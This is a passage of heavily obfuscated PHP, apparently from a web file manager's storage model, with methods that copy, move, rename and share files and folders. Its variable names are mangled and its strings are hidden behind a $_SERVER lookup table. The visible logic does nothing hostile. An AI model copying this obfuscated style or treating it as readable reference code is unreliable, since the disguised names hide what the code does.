$this->fileNameExistAuto($•á÷ìİ¬, $½îÖİ); if ($ñµİùõ÷) { $this->_childrenAllMake($†ê« ™Ú); if ($‘ø¶ûƒ½ && $ŒÏÙìß) { $this->_childrenAllMake($ŒÏÙìß); } } if (!$ŒÏÙìß) { return $this->_copyCreate($†ê« ™Ú, $•á÷ìİ¬, $òì¬ó®£, $ì£ßëş¾); } $õßºış  = $ŒÏÙìß; if ($‘ø¶ûƒ½) { if ($ÂÅÁË§ == REPEAT_RENAME_FOLDER) { $òì¬ó®£ = $this->fileNameAutoCache($•á÷ìİ¬, $òì¬ó®£, $ÂÅÁË§, $‘ø¶ûƒ½); $õßºış  = $this->_copyCreate($†ê« ™Ú, $•á÷ìİ¬, $òì¬ó®£, $ì£ßëş¾); } else { $«Œ…¨ïß = $this->_childrenList($†ê« ™Ú); foreach ($«Œ…¨ïß as $îîÆœú) { $this->_copy($îîÆœú[$¦æÃ‹®»[192]], $ŒÏÙìß, $ÂÅÁË§, $ì£ßëş¾, !1); } } } else { if ($ÂÅÁË§ == REPEAT_RENAME || $ÂÅÁË§ == REPEAT_RENAME_FOLDER) { $òì¬ó®£ = $this->fileNameAutoCache($•á÷ìİ¬, $òì¬ó®£, $ÂÅÁË§, $‘ø¶ûƒ½); $õßºış  = $this->_copyCreate($†ê« ™Ú, $•á÷ìİ¬, $òì¬ó®£, $ì£ßëş¾); } else { if ($ÂÅÁË§ == REPEAT_REPLACE) { $«¬ˆÊÑ³ = $this->sourceInfoCache($ŒÏÙìß); $·»½•Û = $this->fileHistory($«¬ˆÊÑ³, $½îÖİ[$¦æÃ‹®»[562]], $½îÖİ[$¦æÃ‹®»[79]]); if ($·»½•Û) { $ì£ßëş¾[$¦æÃ‹®»[657]][] = $½îÖİ[$¦æÃ‹®»[562]]; } } else { if ($ÂÅÁË§ == REPEAT_SKIP) { } } } Hook::trigger($¦æÃ‹®»[662], array($¦æÃ‹®»[663], $½îÖİ, 0)); } return $õßºış ; } private function _copyCreate($Ûœ–„¼, $¦¼šı±™, $íûåÖÌ, &$†üáÌ×±) { $Òû×Û½İ =& $_SERVER[áäÒ½¯Ç]; $ÖéŸî’¯ = $this->sourceInfoCache($Ûœ–„¼); $‡ŠÈ©ÁÎ = $this->sourceInfoCache($¦¼šı±™); $‰Ï²Šˆª = $this->_makeItemData($ÖéŸî’¯, $‡ŠÈ©ÁÎ, $íûåÖÌ); Hook::trigger($Òû×Û½İ[664], $‰Ï²Šˆª); Hook::trigger($Òû×Û½İ[665], array($Òû×Û½İ[666], $‰Ï²Šˆª, 0)); $›ÌÎŠ¹€ = $this->add($‰Ï²Šˆª); $› µ—Äô = array($Òû×Û½İ[192] => $›ÌÎŠ¹€, $Òû×Û½İ[32] => $íûåÖÌ); $this->_copyApplyMeta($› µ—Äô, $†üáÌ×±); if ($ÖéŸî’¯[$Òû×Û½İ[505]] != $Òû×Û½İ[91]) { $†üáÌ×±[$Òû×Û½İ[657]][] = $ÖéŸî’¯[$Òû×Û½İ[562]]; return $›ÌÎŠ¹€; } $Ãè­©Ë› = array(); $–ƒş’ª = array(); $this->_childrenListAll($Ûœ–„¼, $Ãè­©Ë›); $½¡éçšó = count($Ãè­©Ë›); if ($½¡éçšó == 0) { return $›ÌÎŠ¹€; } $Ê•¢ò‹‹ = $this->sourceInfo($›ÌÎŠ¹€); foreach ($Ãè­©Ë› as $ÅŒŞé«) { $–ìÆà—‘ = $this->_makeItemData($ÅŒŞé«, $Ê•¢ò‹‹, $ÅŒŞé«[$Òû×Û½İ[32]]); $–ìÆà—‘[$Òû×Û½İ[609]] = $ÅŒŞé«[$Òû×Û½İ[609]]; $–ƒş’ª[] = $–ìÆà—‘; } $this->chunkEventSet($Òû×Û½İ[667], array($Òû×Û½İ[668], $‰Ï²Šˆª, $½¡éçšó)); $this->addAll($–ƒş’ª, array(), !1); $Ê¿ë½ÇÑ = $this->where(array($Òû×Û½İ[191] => $›ÌÎŠ¹€))->select(); $…¤´Ì¡  = $this->_childrenMakeRelation($Ãè­©Ë›, $Ê¿ë½ÇÑ); $…¤´Ì¡ [$Ûœ–„¼] = $›ÌÎŠ¹€; $şëÑ·˜ï = array(); $©ƒÖîº = array(); foreach ($Ê¿ë½ÇÑ as $ÅŒŞé«) { $œçƒàÙí = $ÅŒŞé«[$Òû×Û½İ[192]]; $€Êó»‘« = $this->_childrenMatch($…¤´Ì¡ , $ÅŒŞé«, $Ê•¢ò‹‹); $şëÑ·˜ï[] = array($Òû×Û½İ[192], $œçƒàÙí, $Òû×Û½İ[191], $€Êó»‘«[$Òû×Û½İ[191]]); $©ƒÖîº[] = array($Òû×Û½İ[192], $œçƒàÙí, $Òû×Û½İ[609], $€Êó»‘«[$Òû×Û½İ[609]]); $this->_copyApplyMeta($ÅŒŞé«, $†üáÌ×±); if ($ÅŒŞé«[$Òû×Û½İ[505]] != $Òû×Û½İ[91]) { $†üáÌ×±[$Òû×Û½İ[657]][] = $ÅŒŞé«[$Òû×Û½İ[562]]; } } $this->chunkEventSet($Òû×Û½İ[669], array($Òû×Û½İ[670], $‰Ï²Šˆª, $½¡éçšó)); $this->saveAll($şëÑ·˜ï); $this->chunkEventSet($Òû×Û½İ[671], array($Òû×Û½İ[672], $‰Ï²Šˆª, $½¡éçšó)); $this->saveAll($©ƒÖîº); return $›ÌÎŠ¹€; } private function _childrenMakeRelation($öÌŸúë’, $½ı°¯ªÄ) { $Ø±ı±“ˆ =& $_SERVER[áäÒ½¯Ç]; $ã´Â™Ÿ¼ = array(); $¸…äåäì = array(); foreach ($öÌŸúë’ as $„õÒ·Í) { $ŠÒØ•«Æ = $„õÒ·Í[$Ø±ı±“ˆ[32]] . $Ø±ı±“ˆ[8] . $„õÒ·Í[$Ø±ı±“ˆ[609]]; $ã´Â™Ÿ¼[$ŠÒØ•«Æ] = $„õÒ·Í[$Ø±ı±“ˆ[192]]; } foreach ($½ı°¯ªÄ as $„õÒ·Í) { $ŠÒØ•«Æ = $„õÒ·Í[$Ø±ı±“ˆ[32]] . $Ø±ı±“ˆ[8] . $„õÒ·Í[$Ø±ı±“ˆ[609]]; $¯¿ìˆå = $ã´Â™Ÿ¼[$ŠÒØ•«Æ]; $¸…äåäì[$¯¿ìˆå] = $„õÒ·Í[$Ø±ı±“ˆ[192]]; } return $¸…äåäì; } private function _childrenMatch($ö³ıå, $°”Ä×î, $óûÑĞ±Ä) { $¯Ğü®€‡ =& $_SERVER[áäÒ½¯Ç]; $˜ê®‰åÛ = $óûÑĞ±Ä[$¯Ğü®€‡[609]]; $é•÷×ø¤ = $this->parentLevelArray($°”Ä×î[$¯Ğü®€‡[609]]); foreach ($é•÷×ø¤ as $¨ÕïïÒ) { if (isset($ö³ıå[$¨ÕïïÒ])) { $˜ê®‰åÛ .= $ö³ıå[$¨ÕïïÒ] . $¯Ğü®€‡[673]; } } $˜ê®‰åÛ = rtrim($˜ê®‰åÛ, $¯Ğü®€‡[50]) . $¯Ğü®€‡[50]; $ï÷å¦×Ç = $this->parentLevelArray($˜ê®‰åÛ); $³ù£‡´ã = $ï÷å¦×Ç[count($ï÷å¦×Ç) - 1]; return array($¯Ğü®€‡[191] => $³ù£‡´ã, $¯Ğü®€‡[609] => $˜ê®‰åÛ); } private function _makeItemData($ÊË¯±±İ, $ ÈÖ¢ö , $àº¡Ã½¢) { $ìŸ­ÒÁ =& $_SERVER[áäÒ½¯Ç]; $×¿Šôˆ = array($ìŸ­ÒÁ[674] => $ÊË¯±±İ[$ìŸ­ÒÁ[505]], $ìŸ­ÒÁ[514] => $àº¡Ã½¢, $ìŸ­ÒÁ[675] => $ÊË¯±±İ[$ìŸ­ÒÁ[506]] ? $ÊË¯±±İ[$ìŸ­ÒÁ[506]] : $ìŸ­ÒÁ[12], $ìŸ­ÒÁ[563] => $ÊË¯±±İ[$ìŸ­ÒÁ[562]] ? $ÊË¯±±İ[$ìŸ­ÒÁ[562]] : 0, $ìŸ­ÒÁ[645] => $ÊË¯±±İ[$ìŸ­ÒÁ[79]] ? $ÊË¯±±İ[$ìŸ­ÒÁ[79]] : 0, $ìŸ­ÒÁ[676] => intval($ ÈÖ¢ö [$ìŸ­ÒÁ[189]]), $ìŸ­ÒÁ[677] => intval($ ÈÖ¢ö [$ìŸ­ÒÁ[594]]), $ìŸ­ÒÁ[678] => intval(USER_ID), $ìŸ­ÒÁ[679] => intval(USER_ID), $ìŸ­ÒÁ[497] => intval($ ÈÖ¢ö [$ìŸ­ÒÁ[192]]), $ìŸ­ÒÁ[680] => $ ÈÖ¢ö [$ìŸ­ÒÁ[609]] . $ ÈÖ¢ö [$ìŸ­ÒÁ[192]] . $ìŸ­ÒÁ[50], $ìŸ­ÒÁ[518] => $ÊË¯±±İ[$ìŸ­ÒÁ[88]] ? $ÊË¯±±İ[$ìŸ­ÒÁ[88]] : time(), $ìŸ­ÒÁ[524] => 0, $ìŸ­ÒÁ[681] => $ìŸ­ÒÁ[12]); return $×¿Šôˆ; } private function _copyApplyMeta($øèØş¯É, &$÷¦œÀê¸) { $µÎÖĞ =& $_SERVER[áäÒ½¯Ç]; $ÅşûÅş­ = $øèØş¯É[$µÎÖĞ[192]]; $Ô†®‰Â­ = $øèØş¯É[$µÎÖĞ[32]]; if (!isset($øèØş¯É[$µÎÖĞ[682]]) || !$øèØş¯É[$µÎÖĞ[682]] || $øèØş¯É[$µÎÖĞ[682]] == $µÎÖĞ[239]) { $÷¦œÀê¸[$µÎÖĞ[659]][] = array($µÎÖĞ[192], $ÅşûÅş­, $µÎÖĞ[682], short_id($ÅşûÅş­)); } if (Input::check($Ô†®‰Â­, $µÎÖĞ[683])) { $÷¦œÀê¸[$µÎÖĞ[658]][] = array($µÎÖĞ[192] => $ÅşûÅş­, $µÎÖĞ[95] => $µÎÖĞ[557], $µÎÖĞ[460] => str_replace($µÎÖĞ[53], $µÎÖĞ[12], Pinyin::get($Ô†®‰Â­))); $÷¦œÀê¸[$µÎÖĞ[658]][] = array($µÎÖĞ[192] => $ÅşûÅş­, $µÎÖĞ[95] => $µÎÖĞ[556], $µÎÖĞ[460] => Pinyin::get($Ô†®‰Â­, $µÎÖĞ[684])); } $÷¦œÀê¸[$µÎÖĞ[658]][] = array($µÎÖĞ[192] => $ÅşûÅş­, $µÎÖĞ[95] => $µÎÖĞ[536], $µÎÖĞ[460] => KodSort::makeStr($Ô†®‰Â­)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($°íÜ½æ) { $“øá¦‹ =& $_SERVER[áäÒ½¯Ç]; $€Ê‘Æ¼ª = $this->sourceInfo($°íÜ½æ); $…ø½ùÜİ = $“øá¦‹[685]; $—…û¤¨» = array($“øá¦‹[609] => array($“øá¦‹[640], $€Ê‘Æ¼ª[$“øá¦‹[609]] . $°íÜ½æ . $“øá¦‹[641]), $“øá¦‹[525] => $this->targetIsDelete); $Æ¼àúù— = $this->field($…ø½ùÜİ)->where($—…û¤¨»)->select(); if (!$Æ¼àúù—) { return; } $Æ¼àúù— = array_to_keyvalue($Æ¼àúù—, $“øá¦‹[192]); foreach ($Æ¼àúù— as $ğ¾ŒÜè¢) { $æÖ“Ã‰Æ = $ğ¾ŒÜè¢[$“øá¦‹[191]]; $°íÜ½æ = $ğ¾ŒÜè¢[$“øá¦‹[192]]; if (!isset($this->_childrenListCache[$°íÜ½æ]) && $ğ¾ŒÜè¢[$“øá¦‹[505]] == $“øá¦‹[91]) { $this->_childrenListCache[$°íÜ½æ] = array(); } if (!isset($this->_childrenListCache[$æÖ“Ã‰Æ])) { $this->_childrenListCache[$æÖ“Ã‰Æ] = array(); } $this->_childrenListCache[$æÖ“Ã‰Æ][$°íÜ½æ] = $ğ¾ŒÜè¢; $this->_childrenItemCache[$°íÜ½æ] = $ğ¾ŒÜè¢; } } private function _childrenListAll($Àğ…÷š, &$‘ššúö©) { $Ù”ÁºŞ• =& $_SERVER[áäÒ½¯Ç]; if (!isset($this->_childrenListCache[$Àğ…÷š])) { return; } $¯¢ ÚĞœ = $this->_childrenListCache[$Àğ…÷š]; foreach ($¯¢ ÚĞœ as $¿ªÓÚƒ– => $¨Ü®äÛ) { $‘ššúö©[$¿ªÓÚƒ–] = $¨Ü®äÛ; if ($¨Ü®äÛ[$Ù”ÁºŞ•[505]] == $Ù”ÁºŞ•[91]) { $this->_childrenListAll($¿ªÓÚƒ–, $‘ššúö©); } } } private function sourceInfoCache($ÃÓúÁó) { if (isset($this->_childrenItemCache[$ÃÓúÁó])) { return $this->_childrenItemCache[$ÃÓúÁó]; } return $this->sourceInfo($ÃÓúÁó); } private function _childrenList($ÄÊà¨¸) { if (isset($this->_childrenListCache[$ÄÊà¨¸])) { return $this->_childrenListCache[$ÄÊà¨¸]; } return $this->_childrenListSelect($ÄÊà¨¸); } private function _childrenListSelect($§¬üÚ‚) { $î×éıìî =& $_SERVER[áäÒ½¯Ç]; $Îòƒ–†‘ = array($î×éıìî[191] => $§¬üÚ‚, $î×éıìî[525] => $this->targetIsDelete); $¦Ü©Ùõ = $this->where($Îòƒ–†‘)->select(); $¦Ü©Ùõ = $¦Ü©Ùõ ? $¦Ü©Ùõ : array(); $äÖ ŒÎĞ = array_to_keyvalue($¦Ü©Ùõ, $î×éıìî[192]); $this->_childrenListCache[$§¬üÚ‚] = $äÖ ŒÎĞ; foreach ($äÖ ŒÎĞ as $§¬üÚ‚ => $Ê‚ëéšÀ) { $this->_childrenItemCache[$§¬üÚ‚] = $Ê‚ëéšÀ; } return $äÖ ŒÎĞ; } private function fileNameExistAuto($±ÍÚÔ°·, $¶£ÆûÒ’) { $òê‚â§ =& $_SERVER[áäÒ½¯Ç]; if ($¶£ÆûÒ’[$òê‚â§[525]] == $òê‚â§[91]) { return $this->fileNameExist($±ÍÚÔ°·, $¶£ÆûÒ’[$òê‚â§[32]]); } return $this->fileNameExistCache($±ÍÚÔ°·, $¶£ÆûÒ’[$òê‚â§[32]]); } private function fileNameExistCache($†”‰Ç´î, $»ëÙÕ§›) { $Ü®êİŸ– =& $_SERVER[áäÒ½¯Ç]; $»ëÙÕ§› = strtolower($»ëÙÕ§›); $¡…‡ù¾Ú = $this->_childrenList($†”‰Ç´î); foreach ($¡…‡ù¾Ú as $Û—ÉÆ»İ) { if ($»ëÙÕ§› == strtolower($Û—ÉÆ»İ[$Ü®êİŸ–[32]])) { return $Û—ÉÆ»İ[$Ü®êİŸ–[192]]; } } return !1; } private function fileNameAutoCache($ßûú­¾, $Á§ĞäÏß, $™ÍãïØ÷, $ÛĞİêÖø) { $Õ€î‘¤˜ =& $_SERVER[áäÒ½¯Ç]; $Ù”ÅŞ† = $this->_childrenList($ßûú­¾); $³‹û¢Ù„ = array_to_keyvalue($Ù”ÅŞ†, $Õ€î‘¤˜[12], $Õ€î‘¤˜[32]); return $this->fileNameAutoGet($³‹û¢Ù„, $Á§ĞäÏß, $™ÍãïØ÷, $ÛĞİêÖø); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($şà¿ıÊ, $ÄÕ»è³ , $»ª¿™§ê = REPEAT_REPLACE, $ß‘‘õû = '') { $—æ†­Ôû =& $_SERVER[áäÒ½¯Ç]; $œ—‰·é = $this->sourceInfo($şà¿ıÊ); $ŞªÁÕ“ = $this->sourceInfo($ÄÕ»è³ ); if ($œ—‰·é[$—æ†­Ôû[191]] == $ŞªÁÕ“[$—æ†­Ôû[192]]) { if ($œ—‰·é[$—æ†­Ôû[525]] == $—æ†­Ôû[91]) { Model($—æ†­Ôû[523])->restore(array($şà¿ıÊ)); } if (!$ß‘‘õû || $ß‘‘õû == $œ—‰·é[$—æ†­Ôû[32]]) { return $şà¿ıÊ; } } $–Ê§øÎÔ = $this->pathInfoMore($şà¿ıÊ); if ($this->isParentOf($şà¿ıÊ, $ÄÕ»è³ )) { return !1; } if (!$œ—‰·é || !$ŞªÁÕ“ || $ŞªÁÕ“[$—æ†­Ôû[505]] != $—æ†­Ôû[91]) { return !1; } Hook::trigger($—æ†­Ôû[686], $–Ê§øÎÔ); $this->targetIsDelete = intval($œ—‰·é[$—æ†­Ôû[525]]); if ($œ—‰·é[$—æ†­Ôû[191]] == $ÄÕ»è³  && $ß‘‘õû != $œ—‰·é[$—æ†­Ôû[32]]) { $áÇİÑ•Â = $this->fileNameExist($ÄÕ»è³ , $ß‘‘õû); if ($áÇİÑ•Â && $œ—‰·é[$—æ†­Ôû[505]] == $—æ†­Ôû[239]) { $Ô×ù† = $this->sourceInfo($áÇİÑ•Â); $ßÕ€Ÿà÷ = $this->fileHistory($Ô×ù†, $œ—‰·é[$—æ†­Ôû[562]], $œ—‰·é[$—æ†­Ôû[79]]); if (!$ßÕ€Ÿà÷) { Model($—æ†­Ôû[565])->remove($œ—‰·é[$—æ†­Ôû[562]]); } $this->removeNow($şà¿ıÊ, !1); $this->folderSizeReset($ÄÕ»è³ ); Hook::trigger($—æ†­Ôû[687], $–Ê§øÎÔ); return $áÇİÑ•Â; } } $˜¨àñüˆ = $ß‘‘õû ? $ß‘‘õû : $œ—‰·é[$—æ†­Ôû[32]]; $this->lockMoveStart($şà¿ıÊ); $this->lockWriteStart($ÄÕ»è³ , $˜¨àñüˆ); $•‚è€å  = array($—æ†­Ôû[657] => array(), $—æ†­Ôû[688] => !1); $this->clearShare($şà¿ıÊ, $ÄÕ»è³ ); $˜Ã§¡¤İ = $this->fileNameExistAuto($ÄÕ»è³ , $œ—‰·é); $ïçØ¼ö¬ = $this->_move($şà¿ıÊ, $ÄÕ»è³ , $»ª¿™§ê, $•‚è€å , $ß‘‘õû); $this->sourceCacheClear(); if ($œ—‰·é[$—æ†­Ôû[505]] == $—æ†­Ôû[91] && $˜Ã§¡¤İ) { $this->folderSizeResetChildren($ïçØ¼ö¬); } Model($—æ†­Ôû[241])->linkAdd($•‚è€å [$—æ†­Ôû[657]]); if ($ïçØ¼ö¬ && $˜Ã§¡¤İ && $•‚è€å [$—æ†­Ôû[688]]) { $Å¨ÜÚ‰½ = $œ—‰·é[$—æ†­Ôû[505]] == $—æ†­Ôû[91] ? $this->_childrenListSelect($şà¿ıÊ) : !1; $ÛÇ²ØÆ½ = $Å¨ÜÚ‰½ && count($Å¨ÜÚ‰½) > 0 ? !0 : !1; $this->removeNow($şà¿ıÊ, $ÛÇ²ØÆ½); } $this->lockMoveEnd($şà¿ıÊ); $this->lockWriteEnd($ÄÕ»è³ , $˜¨àñüˆ); $this->folderSizeReset($œ—‰·é[$—æ†­Ôû[191]]); $this->folderSizeReset($ÄÕ»è³ ); $×¡§‚· = array($œ—‰·é[$—æ†­Ôû[191]], $ÄÕ»è³ ); if ($œ—‰·é[$—æ†­Ôû[505]] == $—æ†­Ôû[91]) { $×¡§‚·[] = $şà¿ıÊ; } $this->updateModifyTime($×¡§‚·); Model($—æ†­Ôû[661])->eventMove($şà¿ıÊ, $œ—‰·é[$—æ†­Ôû[191]], $ÄÕ»è³ ); Hook::trigger($—æ†­Ôû[687], $–Ê§øÎÔ); return $ïçØ¼ö¬; } private function _move($î‘Ï±Âï, $Ù·‹Òæá, $‹ô­á´‰, &$Á¯±ğÆœ, $àı“æ×ê = '') { $’³ÎĞ†Î =& $_SERVER[áäÒ½¯Ç]; $õ…ØÎğû = $this->sourceInfo($î‘Ï±Âï); $Ü¥ÔÔª÷ = $õ…ØÎğû[$’³ÎĞ†Î[505]] == $’³ÎĞ†Î[91]; $€ô¹ Œ = $àı“æ×ê ? $àı“æ×ê : $õ…ØÎğû[$’³ÎĞ†Î[32]]; $¾ÂÃ·ç— = $this->fileNameExistAuto($Ù·‹Òæá, $õ…ØÎğû); $this->lockMoveStart($î‘Ï±Âï); $this->lockWriteStart($Ù·‹Òæá, $€ô¹ Œ); if (!$¾ÂÃ·ç—) { return $this->_moveForce($î‘Ï±Âï, $Ù·‹Òæá, $€ô¹ Œ); } $Éƒ¿Ğ‹± = $¾ÂÃ·ç—; $æÌ”°‡ = !1; if ($Ü¥ÔÔª÷) { if ($‹ô­á´‰ == REPEAT_RENAME_FOLDER) { $€ô¹ Œ = $this->fileNameAuto($Ù·‹Òæá, $€ô¹ Œ, $‹ô­á´‰, $Ü¥ÔÔª÷); $Éƒ¿Ğ‹± = $this->_moveForce($î‘Ï±Âï, $Ù·‹Òæá, $€ô¹ Œ); } else { $É¼¸“¯ï = $this->_childrenListSelect($î‘Ï±Âï); foreach ($É¼¸“¯ï as $í´´îŸ) { $‹™»È›ª = REPEAT_REPLACE; $this->_move($í´´îŸ[$’³ÎĞ†Î[192]], $¾ÂÃ·ç—, $‹™»È›ª, $Á¯±ğÆœ); } $æÌ”°‡ = !0; } } else { if ($‹ô­á´‰ == REPEAT_RENAME || $‹ô­á´‰ == REPEAT_RENAME_FOLDER) { $€ô¹ Œ = $this->fileNameAuto($Ù·‹Òæá, $€ô¹ Œ, $‹ô­á´‰, $Ü¥ÔÔª÷); $Éƒ¿Ğ‹± = $this->_moveForce($î‘Ï±Âï, $Ù·‹Òæá, $€ô¹ Œ); } else { $ü£ › = $this->sourceInfoCache($¾ÂÃ·ç—); $ äº¬·÷ = $this->fileHistory($ü£ ›, $õ…ØÎğû[$’³ÎĞ†Î[562]], $õ…ØÎğû[$’³ÎĞ†Î[79]]); if ($ äº¬·÷) { $Á¯±ğÆœ[$’³ÎĞ†Î[657]][] = $õ…ØÎğû[$’³ÎĞ†Î[562]]; } $æÌ”°‡ = !0; } } if ($æÌ”°‡) { $Á¯±ğÆœ[$’³ÎĞ†Î[688]] = !0; } return $Éƒ¿Ğ‹±; } private function _moveForce($ë½‰ÏàÕ, $“ˆæÁÙ, $Ø˜º«Ç¬) { $†äêõª„ =& $_SERVER[áäÒ½¯Ç]; $éİ§‘„ = $this->sourceInfo($ë½‰ÏàÕ); $¹Ìµé² = $this->sourceInfo($“ˆæÁÙ); $¸×ä§æ = $éİ§‘„[$†äêõª„[505]] == $†äêõª„[91]; $×Ğ¢ƒíµ = array($†äêõª„[497] => $¹Ìµé²[$†äêõª„[192]], $†äêõª„[680] => $¹Ìµé²[$†äêõª„[609]] . $¹Ìµé²[$†äêõª„[192]] . $†äêõª„[50], $†äêõª„[676] => $¹Ìµé²[$†äêõª„[189]], $†äêõª„[677] => $¹Ìµé²[$†äêõª„[594]], $†äêõª„[679] => USER_ID, $†äêõª„[514] => $Ø˜º«Ç¬); $ÍÌäï¾à = $éİ§‘„[$†äêõª„[189]] == SourceModel::TYPE_GROUP && $¹Ìµé²[$†äêõª„[189]] == SourceModel::TYPE_GROUP && $éİ§‘„[$†äêõª„[594]] == $¹Ìµé²[$†äêõª„[594]]; if (!$ÍÌäï¾à && $this->moveClearAuth) { Model($†äêõª„[592])->authClear($ë½‰ÏàÕ); } $Œš©Åç = $éİ§‘„[$†äêõª„[525]] == $†äêõª„[91] && $¹Ìµé²[$†äêõª„[525]] != $†äêõª„[91]; if ($Œš©Åç) { $×Ğ¢ƒíµ[$†äêõª„[524]] = 0; } if ($¸×ä§æ) { $‚¿Õ½ñ¨ = array($†äêõª„[680] => array($†äêõª„[640], $éİ§‘„[$†äêõª„[609]] . $éİ§‘„[$†äêõª„[192]] . $†äêõª„[641])); $îÒ şİÁ = $éİ§‘„[$†äêõª„[609]] . $éİ§‘„[$†äêõª„[192]] . $†äêõª„[50]; $Ô• úÒ× = $¹Ìµé²[$†äêõª„[609]] . $¹Ìµé²[$†äêõª„[192]] . $†äêõª„[50] . $éİ§‘„[$†äêõª„[192]] . $†äêõª„[50]; $û©õäÊ = array($†äêõª„[680] => array($†äêõª„[689], "\x72\x65\x70\154\x61\x63\x65\x28\x70\x61\x72\145\x6e\164\114\145\166\145\x6c\x2c\47{$îÒ şİÁ}\47\x2c\x27{$Ô• úÒ×}\x27\51"), $†äêõª„[676] => $¹Ìµé²[$†äêõª„[189]], $†äêõª„[677] => $¹Ìµé²[$†äêõª„[594]]); if ($Œš©Åç) { $û©õäÊ[$†äêõª„[524]] = 0; } $this->where($‚¿Õ½ñ¨)->data($û©õäÊ)->save(); } $this->where(array($†äêõª„[511] => $ë½‰ÏàÕ))->data($×Ğ¢ƒíµ)->save(); return $ë½‰ÏàÕ; } private function clearShare($Ê§©ı¥Œ, $æü–Îº‹) { $ÎÛõŒâ =& $_SERVER[áäÒ½¯Ç]; $¤’æ‘„ = $this->sourceInfo($Ê§©ı¥Œ); $†×¸áñ° = $this->sourceInfo($æü–Îº‹); if ($¤’æ‘„[$ÎÛõŒâ[594]] == $†×¸áñ°[$ÎÛõŒâ[594]] && $¤’æ‘„[$ÎÛõŒâ[189]] == $ÎÛõŒâ[690]) { return; } $‹‘áÏÔã = array($ÎÛõŒâ[609] => array($ÎÛõŒâ[640], $¤’æ‘„[$ÎÛõŒâ[609]] . $Ê§©ı¥Œ . $ÎÛõŒâ[641])); $‘ô¿•´ = $this->field($ÎÛõŒâ[511])->where($‹‘áÏÔã)->getField($ÎÛõŒâ[192], !0); if (!$‘ô¿•´) { return; } $‹‘áÏÔã = array($ÎÛõŒâ[192] => array($ÎÛõŒâ[7], $‘ô¿•´), $ÎÛõŒâ[691] => 1); $µôïĞƒÆ = Model($ÎÛõŒâ[692])->field($ÎÛõŒâ[693])->where($‹‘áÏÔã)->select(); if (!$µôïĞƒÆ) { return; } $µôïĞƒÆ = array_to_keyvalue($µôïĞƒÆ, $ÎÛõŒâ[12], $ÎÛõŒâ[693]); $‹‘áÏÔã = array($ÎÛõŒâ[693] => array($ÎÛõŒâ[7], $µôïĞƒÆ)); Model($ÎÛõŒâ[692])->where($‹‘áÏÔã)->save(array($ÎÛõŒâ[691] => 0)); Model($ÎÛõŒâ[694])->where($‹‘áÏÔã)->delete(); } public function copyFolderFromIO($²úü“Ì, $æŒšÛ«Ê, $©à»ß‘, $ùö‰¥ˆ›, $óïÎ’î, $š“’”® = false) { $ÕÓ”¶ÒÑ =& $_SERVER[áäÒ½¯Ç]; $ö²ÂÅİå = array($ÕÓ”¶ÒÑ[658] => array(), $ÕÓ”¶ÒÑ[659] => array(), $ÕÓ”¶ÒÑ[657] => array(), $ÕÓ”¶ÒÑ[695] => array()); $À•¨±Çª = $š“’”® ? $š“’”® : $²úü“Ì->pathThis($æŒšÛ«Ê); $ÑÃ­Ø¶¯ = $this->fileNameExist($©à»ß‘, $À•¨±Çª); $²”¼‚ÊÁ = $this->mkdir($©à»ß‘, $À•¨±Çª, $ùö‰¥ˆ›); if (!$ÑÃ­Ø¶¯ || $ùö‰¥ˆ› == REPEAT_RENAME_FOLDER) { $ùö‰¥ˆ› = !1; } if ($ÑÃ­Ø¶¯) { $this->_childrenAllMake($ÑÃ­Ø¶¯); } Hook::trigger($ÕÓ”¶ÒÑ[696]); $­˜üÓìÔ = KodIO::ioFileDriverGet($ÕÓ”¶ÒÑ[503] . $©à»ß‘ . $ÕÓ”¶ÒÑ[412]); $this->_copyChildTo($²úü“Ì, $æŒšÛ«Ê, $²”¼‚ÊÁ, $ùö‰¥ˆ›, $ö²ÂÅİå, $óïÎ’î, $­˜üÓìÔ); Hook::trigger($ÕÓ”¶ÒÑ[697]); if ($²”¼‚ÊÁ) { $this->folderSizeResetChildren($²”¼‚ÊÁ); } $this->_childrenListClear(); Model($ÕÓ”¶ÒÑ[660])->addAll($ö²ÂÅİå[$ÕÓ”¶ÒÑ[658]], array(), !0); Model($ÕÓ”¶ÒÑ[661])->eventCopy($²”¼‚ÊÁ); $this->saveAll($ö²ÂÅİå[$ÕÓ”¶ÒÑ[659]]); Model($ÕÓ”¶ÒÑ[565])->linkAdd($ö²ÂÅİå[$ÕÓ”¶ÒÑ[657]]); Model($ÕÓ”¶ÒÑ[565])->remove($ö²ÂÅİå[$ÕÓ”¶ÒÑ[695]]); $this->folderSizeReset($©à»ß‘); $this->updateModifyTime($©à»ß‘); return $²”¼‚ÊÁ; } private function _copyChildTo($¿€Ÿï®˜, $ñ½ºüÆÏ, $¶ı€–õ«, $ßÅ¿¥¿Õ, &$¡ôÙŒãÆ, $×ìÇÛœÙ, $ğÊ„¼ÄÉ) { $Ä¨íï·– =& $_SERVER[áäÒ½¯Ç]; $óÑû¹—Ì = $this->sourceInfoCache($¶ı€–õ«); $áõÔˆº¯ = $¿€Ÿï®˜->listPath($ñ½ºüÆÏ); $áõÔˆº¯ = $áõÔˆº¯ ? $áõÔˆº¯ : array($Ä¨íï·–[86] => array(), $Ä¨íï·–[85] => array()); $š‹ªşñÀ = array_merge($áõÔˆº¯[$Ä¨íï·–[86]], $áõÔˆº¯[$Ä¨íï·–[85]]); $Ö†Ÿ©‚” = $this->_addFiles($¿€Ÿï®˜, $ğÊ„¼ÄÉ, $áõÔˆº¯[$Ä¨íï·–[86]], $×ìÇÛœÙ); $ò†ıÎ‰ë = array(); foreach ($š‹ªşñÀ as &$ù„ü«å•) { if (isset($Ö†Ÿ©‚”[$ù„ü«å•[$Ä¨íï·–[32]]])) { $ù„ü«å• = $Ö†Ÿ©‚”[$ù„ü«å•[$Ä¨íï·–[32]]]; } $ù„ü«å•[$Ä¨íï·–[505]] = $ù„ü«å•[$Ä¨íï·–[33]] == $Ä¨íï·–[78]; $ù„ü«å•[$Ä¨íï·–[506]] = substr(_get($ù„ü«å•, $Ä¨íï·–[167], $Ä¨íï·–[12]), 0, 10); $ù„ü«å•[$Ä¨íï·–[79]] = _get($ù„ü«å•, $Ä¨íï·–[79], 0); $ù„ü«å•[$Ä¨íï·–[562]] = _get($ù„ü«å•, $Ä¨íï·–[562], 0); if (!isset($ù„ü«å•[$Ä¨íï·–[698]]) && $ù„ü«å•[$Ä¨íï·–[562]]) { $¡ôÙŒãÆ[$Ä¨íï·–[695]][] = $ù„ü«å•[$Ä¨íï·–[562]]; } if 